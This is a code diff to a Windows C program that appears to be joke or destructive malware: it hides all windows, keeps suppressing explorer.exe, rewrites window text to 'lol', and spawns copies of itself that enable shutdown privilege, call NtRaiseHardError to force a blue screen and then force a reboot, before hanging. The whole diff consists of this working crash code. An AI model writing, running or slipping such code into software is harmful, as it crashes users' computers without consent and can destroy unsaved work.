@@ -200,28 +200,21 @@ DWORD __stdcall SuppressFileExplorer(void*)
 
 void Crash()
 {
-	SendMessageA(HWND_BROADCAST, WM_DESTROY, 0, 0); //Close all windows
+	SendMessageA(HWND_BROADCAST, WM_SHOWWINDOW, 0, 1); //Hide all windows
 	CreateThread(0, 0, SuppressFileExplorer, 0, 0, 0); //Keep suppressing explorer.exe
 	
-	Sleep(5000); //Wait a bit
+	char* exePath = (char*)LocalAlloc(LMEM_ZEROINIT, 8192);
+	GetModuleFileNameA(0, exePath, 8192);
 
-	HANDLE token;
-	TOKEN_PRIVILEGES privileges;
+	STARTUPINFOA si;
+	PROCESS_INFORMATION pi;
 
-	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);
+	RtlZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	RtlZeroMemory(&pi, sizeof(pi));
 
-	LookupPrivilegeValueW(0, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
-	privileges.PrivilegeCount = 1;
-	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-
-	AdjustTokenPrivileges(token, 0, &privileges, 0, (PTOKEN_PRIVILEGES)0, 0); //Get shutdown privilege
-
-	FARPROC NtRaiseHardError = GetProcAddress(LoadLibraryA("ntdll"), "NtRaiseHardError");
-
-	ULONG response;
-	((void(*)(ULONG, ULONG, ULONG, PULONG, ULONG, PULONG))NtRaiseHardError)(0xC000021A, 0, 0, 0, 6, &response); //Trigger BSoD
-
-	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_SYSTEM | SHTDN_REASON_MINOR_BLUESCREEN); //In case it didn't work, restart Windows
+	for (int i = 0; i < 10; i++)
+		CreateProcessA(0, lstrcatA(exePath, " lol"), 0, 0, 0, 0, 0, 0, &si, &pi); //Create processes to trigger BSoD
 }
 
 int __stdcall WinMain(HINSTANCE hI, HINSTANCE, LPSTR, int)
@@ -237,11 +230,40 @@ int __stdcall WinMain(HINSTANCE hI, HINSTANCE, LPSTR, int)
 
 			return 0;
 		}
+		else if (lstrcmpA(__argv[1], "lol") == 0)
+		{
+			Sleep(5000);
+
+			HANDLE token;
+			TOKEN_PRIVILEGES privileges;
+
+			OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);
+
+			LookupPrivilegeValueW(0, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
+			privileges.PrivilegeCount = 1;
+			privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+			AdjustTokenPrivileges(token, 0, &privileges, 0, (PTOKEN_PRIVILEGES)0, 0); //Get shutdown privilege
+
+			FARPROC NtRaiseHardError = GetProcAddress(LoadLibraryA("ntdll"), "NtRaiseHardError");
+
+			ULONG response;
+			((void(*)(ULONG, ULONG, ULONG, PULONG, ULONG, PULONG))NtRaiseHardError)(0xC0000001, 0, 0, 0, 6, &response); //Trigger BSoD
+
+			ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_SYSTEM | SHTDN_REASON_MINOR_BLUESCREEN); //In case it didn't work, restart Windows
+		}
 
 	char* exePath = (char*)LocalAlloc(LMEM_ZEROINIT, 8192);
 	GetModuleFileNameA(0, exePath, 8192);
 
-	ShellExecuteA(0, 0, exePath, "msg", 0, SW_SHOWDEFAULT);
+	STARTUPINFOA si;
+	PROCESS_INFORMATION pi;
+
+	RtlZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	RtlZeroMemory(&pi, sizeof(pi));
+
+	CreateProcessA(0, lstrcatA(exePath, " msg"), 0, 0, 0, 0, 0, 0, &si, &pi);
 
 	EnumChildWindows(GetDesktopWindow(), &LolText, 0); //Change all text to "lol"
 	
@@ -252,4 +274,6 @@ int __stdcall WinMain(HINSTANCE hI, HINSTANCE, LPSTR, int)
 	stop = true;
 
 	Crash(); //Mess up Windows
+
+	while (true); //Hang
 }
